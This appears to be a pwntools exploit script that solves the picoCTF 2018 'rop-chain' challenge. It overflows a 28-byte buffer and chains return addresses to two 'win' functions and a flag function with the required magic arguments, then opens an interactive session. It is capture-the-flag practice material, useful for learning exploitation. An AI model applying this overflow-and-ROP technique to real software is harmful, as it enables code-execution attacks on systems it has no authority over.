#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 1
_local = 1

host = '2018shell1.picoctf.com'
user = 'roy4801'
pw   = ''

_work_dir = '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47'
_exe = 'rop'

if not _local:
	ssh_cl = ssh(host=host, user=user, password=pw)
	ssh_cl.set_working_directory(_work_dir)
	r = ssh_cl.process('./' + _exe)
else:
	r = process('./' + _exe)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

payload='A' * 28

win_func1 = 0x80485cc
win_func2 = 0x80485d9
flag = 0x804862c

payload += p32(win_func1) + 'AAAA'

payload += p32(win_func2)
payload += 'BBBB' + p32(flag) + p32(0xBAAAAAAD) + "CCCC"  + p32(0xDEADBAAD)

# 'BBBB' + p32(flag) + p32(0xBAAAAAAD)
# p32(0xBAAAAAAD) + "CCCC"  + p32(0xDEADBAAD)
#  [old ebp][ret addr][arg[0]]
print r.recvuntil('> ')
r.sendline(payload)
# print r.recv()
r.interactive()